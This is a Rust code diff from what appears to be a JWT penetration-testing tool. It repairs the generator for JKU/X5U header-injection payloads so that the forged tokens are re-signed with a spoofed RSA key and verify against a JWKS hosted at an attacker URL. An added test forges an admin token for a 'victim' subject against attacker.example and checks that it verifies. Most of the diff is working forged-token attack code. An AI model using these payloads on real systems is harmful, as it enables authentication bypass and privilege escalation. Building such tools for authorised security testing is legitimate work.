@@ -453,6 +453,24 @@ pub struct KeyVerifyResult {
     pub error: Option<String>,
 }
 
+/// Map an RSA `alg` name to its [`jsonwebtoken::Algorithm`]. Only the RSA family
+/// is accepted, matching the algorithms [`generate_spoofed_jwks`] can produce.
+fn jwt_algorithm_from_str(algorithm: &str) -> Result<jsonwebtoken::Algorithm> {
+    use jsonwebtoken::Algorithm;
+    match algorithm.to_uppercase().as_str() {
+        "RS256" => Ok(Algorithm::RS256),
+        "RS384" => Ok(Algorithm::RS384),
+        "RS512" => Ok(Algorithm::RS512),
+        "PS256" => Ok(Algorithm::PS256),
+        "PS384" => Ok(Algorithm::PS384),
+        "PS512" => Ok(Algorithm::PS512),
+        other => Err(anyhow!(
+            "Unsupported algorithm for JWKS injection: {}",
+            other
+        )),
+    }
+}
+
 /// Generate JKU/X5U injection payloads with a real spoofed JWKS
 pub fn generate_jwks_injection_payloads(
     token: &str,
@@ -471,46 +489,47 @@ pub fn generate_jwks_injection_payloads(
         return Err(anyhow!("Invalid signed token format"));
     }
 
-    // Re-encode headers with jku/x5u pointing to attacker URL
+    // Decode the signed token for the header (its kid → picks the spoofed key) and claims.
     let decoded = crate::jwt::decode(&signed_token)?;
     let claims_part = parts[1];
-    let signature_part = parts[2];
 
-    let mut payloads = Vec::new();
+    // Injecting jku/x5u changes the header, and therefore the signing input, so the
+    // spoofed token's original signature no longer covers it. Re-sign each variant
+    // with the spoofed private key over the new `header.claims`; without this the
+    // payload never verifies against the attacker-hosted JWKS, defeating the attack.
+    let jwt_alg = jwt_algorithm_from_str(algorithm)?;
+    let encoding_key = jsonwebtoken::EncodingKey::from_rsa_pem(spoofed.private_key_pem.as_bytes())
+        .map_err(|e| anyhow!("Failed to load spoofed private key for re-signing: {}", e))?;
 
-    // JKU injection
-    let mut jku_header = serde_json::Map::new();
-    for (k, v) in &decoded.header {
-        jku_header.insert(k.clone(), v.clone());
-    }
-    jku_header.insert(
-        "jku".to_string(),
-        Value::String(format!("{}/jwks.json", attacker_url.trim_end_matches('/'))),
-    );
-    let jku_header_json = serde_json::to_string(&jku_header)?;
-    let jku_header_b64 = URL_SAFE_NO_PAD.encode(jku_header_json.as_bytes());
-    payloads.push(InjectionPayload {
-        header_type: "jku".to_string(),
-        token: format!("{}.{}.{}", jku_header_b64, claims_part, signature_part),
-        description: format!("JKU injection pointing to {}/jwks.json", attacker_url),
-    });
+    let sign_injection = |header_key: &str, url: String| -> Result<InjectionPayload> {
+        let mut header = serde_json::Map::new();
+        for (k, v) in &decoded.header {
+            header.insert(k.clone(), v.clone());
+        }
+        header.insert(header_key.to_string(), Value::String(url.clone()));
+        let header_json = serde_json::to_string(&header)?;
+        let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());
+        let signing_input = format!("{header_b64}.{claims_part}");
+        let signature_b64 =
+            jsonwebtoken::crypto::sign(signing_input.as_bytes(), &encoding_key, jwt_alg).map_err(
+                |e| anyhow!("Failed to re-sign {} injection payload: {}", header_key, e),
+            )?;
+        Ok(InjectionPayload {
+            header_type: header_key.to_string(),
+            token: format!("{signing_input}.{signature_b64}"),
+            description: format!(
+                "{} injection pointing to {}",
+                header_key.to_uppercase(),
+                url
+            ),
+        })
+    };
 
-    // X5U injection
-    let mut x5u_header = serde_json::Map::new();
-    for (k, v) in &decoded.header {
-        x5u_header.insert(k.clone(), v.clone());
-    }
-    x5u_header.insert(
-        "x5u".to_string(),
-        Value::String(format!("{}/cert.pem", attacker_url.trim_end_matches('/'))),
-    );
-    let x5u_header_json = serde_json::to_string(&x5u_header)?;
-    let x5u_header_b64 = URL_SAFE_NO_PAD.encode(x5u_header_json.as_bytes());
-    payloads.push(InjectionPayload {
-        header_type: "x5u".to_string(),
-        token: format!("{}.{}.{}", x5u_header_b64, claims_part, signature_part),
-        description: format!("X5U injection pointing to {}/cert.pem", attacker_url),
-    });
+    let base = attacker_url.trim_end_matches('/');
+    let payloads = vec![
+        sign_injection("jku", format!("{base}/jwks.json"))?,
+        sign_injection("x5u", format!("{base}/cert.pem"))?,
+    ];
 
     Ok(JwksInjectionResult {
         jwks_json: spoofed.jwks_json,
@@ -707,6 +726,40 @@ mod tests {
     fn test_generate_spoofed_jwks_unsupported_alg() {
         let result = generate_spoofed_jwks("ES256", None, None);
         assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_jwks_injection_payloads_verify_against_spoofed_jwks() {
+        // The whole point of a jku/x5u injection payload is that once the server
+        // fetches the attacker-hosted JWKS, the token verifies against it. That
+        // requires the signature to cover the *injected* header. Previously the
+        // header was rebuilt (jku/x5u added, keys re-serialized) but the original
+        // signature was kept, so the payloads never verified.
+        let claims = serde_json::json!({ "sub": "victim", "admin": true });
+        let token = crate::jwt::encode(&claims, "irrelevant", "HS256").expect("build source token");
+
+        let result = generate_jwks_injection_payloads(&token, "https://attacker.example", "RS256")
+            .expect("generate injection payloads");
+
+        let jwks: JwkSet = serde_json::from_str(&result.jwks_json).expect("parse spoofed jwks");
+
+        assert_eq!(result.payloads.len(), 2, "expected jku and x5u payloads");
+        for p in &result.payloads {
+            let verdicts = verify_with_jwks(&p.token, &jwks).expect("verify against jwks");
+            assert!(
+                verdicts.iter().any(|v| v.valid),
+                "{} injection payload must verify against the spoofed JWKS, got {:?}",
+                p.header_type,
+                verdicts
+            );
+            // The injected header must actually carry the jku/x5u pointer.
+            let header = crate::jwt::decode(&p.token).expect("decode payload").header;
+            assert!(
+                header.contains_key(&p.header_type),
+                "payload header missing injected {} field",
+                p.header_type
+            );
+        }
     }
 
     #[test]
